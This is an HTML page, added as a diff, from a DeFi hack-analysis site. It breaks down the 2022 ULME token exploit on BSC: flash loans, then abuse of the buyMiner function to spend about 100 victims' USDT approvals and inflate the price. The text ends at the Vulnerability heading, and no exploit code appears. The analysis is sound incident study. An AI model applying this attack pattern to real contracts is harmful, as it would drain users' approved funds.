@@ -1,0 +1,1426 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://autosaida.github.io/DeFiHackAnalysis/2022/221025_ULME/">
+      
+      
+        <link rel="prev" href="../..">
+      
+      
+        <link rel="next" href="../221129_MBC/">
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.41">
+    
+    
+      
+        <title>221025-ULME - DeFiHackAnalysis</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.0253249f.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Merriweather+Sans:300,300i,400,400i,700,700i%7CRed+Hat+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Merriweather Sans";--md-code-font:"Red Hat Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="https://unpkg.com/katex@0/dist/katex.min.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="green" data-md-color-accent="deep-purple">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#221025-ulme" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="DeFiHackAnalysis" class="md-header__button md-logo" aria-label="DeFiHackAnalysis" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            DeFiHackAnalysis
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              221025-ULME
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="green" data-md-color-accent="deep-purple"  aria-label="Dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="blue" data-md-color-accent="deep-orange"  aria-label="Light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/Autosaida/DeFiHackAnalysis" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 480 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1M480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2m-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3m-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="DeFiHackAnalysis" class="md-nav__button md-logo" aria-label="DeFiHackAnalysis" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    DeFiHackAnalysis
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/Autosaida/DeFiHackAnalysis" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 480 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1M480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2m-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3m-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Home
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    2022
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            2022
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    221025-ULME
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    221025-ULME
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#attacktx" class="md-nav__link">
+    <span class="md-ellipsis">
+      AttackTx
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="AttackTx">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#fund-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      Fund Flow
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#balance-changes" class="md-nav__link">
+    <span class="md-ellipsis">
+      Balance Changes
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#state-changes" class="md-nav__link">
+    <span class="md-ellipsis">
+      State Changes
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#invocation-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      Invocation Flow
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#vulnerability" class="md-nav__link">
+    <span class="md-ellipsis">
+      Vulnerability
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploit
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploit">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#reproduce" class="md-nav__link">
+    <span class="md-ellipsis">
+      Reproduce
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attack-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attack Flow
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#misc" class="md-nav__link">
+    <span class="md-ellipsis">
+      Misc
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Misc">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ulme-token" class="md-nav__link">
+    <span class="md-ellipsis">
+      ULME Token
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#victims" class="md-nav__link">
+    <span class="md-ellipsis">
+      Victims
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#frontrunning-protection" class="md-nav__link">
+    <span class="md-ellipsis">
+      Frontrunning Protection
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#patch" class="md-nav__link">
+    <span class="md-ellipsis">
+      Patch
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../221129_MBC/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    221129-MBC-ZZSH
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    2023
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            2023
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2023/230119_SHOCO/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    230119-SHICO
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2023/230126_TINU/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    230126-TINU
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2023/230415_HundredFinance/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    230415-HundredFinance
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2023/230905_FloorDAO/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    230905-FloorDAO
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2023/230905_HeavensGate_JumpFarm_QuantumWN/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    230905-HeavensGate-JumpFarm-QuantumWN
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2023/231018_MicDao/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    231018-MicDao
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2023/231206_TIME/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    231206-TIME
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    2024
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            2024
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../2024/240415_ChaingeFinance/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    240415-ChaingeFinance
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#attacktx" class="md-nav__link">
+    <span class="md-ellipsis">
+      AttackTx
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="AttackTx">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#fund-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      Fund Flow
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#balance-changes" class="md-nav__link">
+    <span class="md-ellipsis">
+      Balance Changes
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#state-changes" class="md-nav__link">
+    <span class="md-ellipsis">
+      State Changes
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#invocation-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      Invocation Flow
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#vulnerability" class="md-nav__link">
+    <span class="md-ellipsis">
+      Vulnerability
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploit
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploit">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#reproduce" class="md-nav__link">
+    <span class="md-ellipsis">
+      Reproduce
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attack-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attack Flow
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#misc" class="md-nav__link">
+    <span class="md-ellipsis">
+      Misc
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Misc">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ulme-token" class="md-nav__link">
+    <span class="md-ellipsis">
+      ULME Token
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#victims" class="md-nav__link">
+    <span class="md-ellipsis">
+      Victims
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#frontrunning-protection" class="md-nav__link">
+    <span class="md-ellipsis">
+      Frontrunning Protection
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#patch" class="md-nav__link">
+    <span class="md-ellipsis">
+      Patch
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  
+  
+
+
+<h1 id="221025-ulme">221025-ULME</h1>
+<h2 id="attacktx">AttackTx</h2>
+<p>Analyzing the <a href="https://explorer.phalcon.xyz/tx/bsc/0xdb9a13bc970b97824e082782e838bdff0b76b30d268f1d66aac507f1d43ff4ed">attack transaction</a> using Phalcon.</p>
+<h3 id="fund-flow">Fund Flow</h3>
+<p><img alt="Fund Flow" src="../../image/221025_ULME.assets/3423.png" /></p>
+<p>By examining the sequence, it's evident that the attacker first borrowed USDT from 7 DODO pools using flash loans and then returned it after executing other operations (borrowing before repaying). This allowed them to acquire a significant amount of funds required for the attack. The Receiver, in this context, refers to the attacker's contract.</p>
+<p><img alt="Fund Flow" src="../../image/221025_ULME.assets/3849.png" /></p>
+<p>Subsequently, using the 1000k USDT obtained through flash loans, the attacker exchanged it for approximately 5232k ULME tokens from PancakeSwap pools (8, 12). Finally, they used approximately 4709k ULME tokens to obtain around 1050k USDT (119, 120), resulting in a net profit of approximately 50k USDT.</p>
+<p>After the attacker obtained ULME tokens, a large number of addresses transferred USDT to the ULME contract (13, 17, 18...). Furthermore, it appears that the ULME contract used these USDT to swap for ULME tokens in the pool (14, 15, 16).</p>
+<p>Hence, these numerous addresses transferring USDT should be considered victims. The attacker initially accumulated a substantial amount of ULME tokens and then manipulated the victim accounts to use their USDT to purchase ULME tokens, artificially inflating the price and profiting from it.</p>
+<p>The reason behind this attack may be that the victim accounts had approved the ULME contract for USDT, and the ULME contract contained an external function that allowed the use of authorized addresses to purchase ULME tokens with USDT (access control vulnerability).</p>
+<h3 id="balance-changes">Balance Changes</h3>
+<p><img alt="Balance Changes" src="../../image/221025_ULME.assets/5050.png" /></p>
+<p>The balance changes corroborate the above analysis.</p>
+<h3 id="state-changes">State Changes</h3>
+<p><img alt="State Changes" src="../../image/221025_ULME.assets/0049.png" /></p>
+<p>The <code>_allowances</code> for USDT show that these addresses approved a substantial amount for the ULME contract and subsequently decreased the allowances.</p>
+<h3 id="invocation-flow">Invocation Flow</h3>
+<p>Next, let's delve into the details of internal calls within the transaction.</p>
+<p><img alt="Invocation Flow" src="../../image/221025_ULME.assets/1439.png" /></p>
+<p>The outermost layer consists of multiple flash loans, borrowing before repaying.</p>
+<p><img alt="Invocation Flow" src="../../image/221025_ULME.assets/1313.png" /></p>
+<p>After borrowing a sufficient amount of USDT, the attacker first exchanged it for a substantial amount of ULME tokens through PancakeRouter. Then, they sequentially retrieved information about the victims' allowances and balances and called the <code>buyMiner</code> function of the ULME contract. (There are approximately 100 victims, suggesting that the attacker had obtained addresses that had previously approved USDT for the ULME contract.)</p>
+<p><img alt="Invocation Flow" src="../../image/221025_ULME.assets/2019.png" /></p>
+<p>Within the <code>buyMiner</code> function, the victim's address transferred USDT to the ULME contract and then used the USDT to exchange for ULME tokens within pools (with a brief detour through address 0x2581, but ultimately, the ULME tokens were not transferred to the victim, which is quite unusual).</p>
+<p><img alt="Invocation Flow" src="../../image/221025_ULME.assets/2713.png" /></p>
+<p>Finally, the attacker converted the ULME tokens back to USDT, realizing their profit, while the victim incurred losses as their USDT was added to the pools to boost the price (and they didn't even receive ULME tokens).</p>
+<h2 id="vulnerability">Vulnerability</h2>
